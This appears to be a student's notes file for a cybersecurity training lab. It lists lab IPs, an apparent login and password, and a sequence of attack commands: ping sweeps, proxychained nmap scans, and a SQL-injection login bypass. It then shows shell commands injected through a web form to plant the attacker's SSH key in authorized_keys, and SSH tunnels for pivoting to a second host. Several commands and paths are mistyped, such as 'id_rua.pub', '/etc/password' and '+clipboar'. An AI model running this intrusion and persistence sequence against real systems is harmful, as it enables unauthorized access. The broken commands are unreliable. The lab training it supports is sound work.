# SecCCTC
NEW Security CCTC


OP station LINUX 10.50.21.175 

uploads 10.50.22.59/uploads for more info
______________________________
17
JORO-501-W
dSMTntzAUGo3pnS
10.50.23.20
____________________________

http://10.50.20.103:8000/challenges  < -- - challenges 



Needed commands
_______________________________________________________
1- for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done
2- proxychains nmap -Pn -sT 10.0.0.X -p 1-10000 -T5   or -iL --openm
3- proxychains nmap -Pn -sT 10.0.0.X -p 80 --script http-enum.nse    < -- finds other webpages

xfreerdp /u:student /v:localhost:RHP /dynamic-resolution +clipboar
___________________________________________

make a SSH KEY 

On opstation
ssh-keygen -t rsa -b 4096
cat .ssh/id_rua.pub
ssh www-data@ip  ( or whatever the webuser is)
9- find the userers in the /etc/password then navigate down to find the file with ls -la 
10 - move the map to the host system 

try to insert an your own key after trying tom’ OR 1 = ‘1 in both fields:
		1 -In webpage box:    < mkdir /users/home/directory/.ssh>  or other path
		2 – echo "your_public_key_here" >> /users/home/directory/.ssh/authorized_keys 
		3-  cat /users/home/directory/.ssh/authorized_keys 


  -______________________________________
  to get to second box student@ip -L 41711:192.168.28.120:4242
  then new tunnle of ssh student@127.0.0.1 -D 9050 
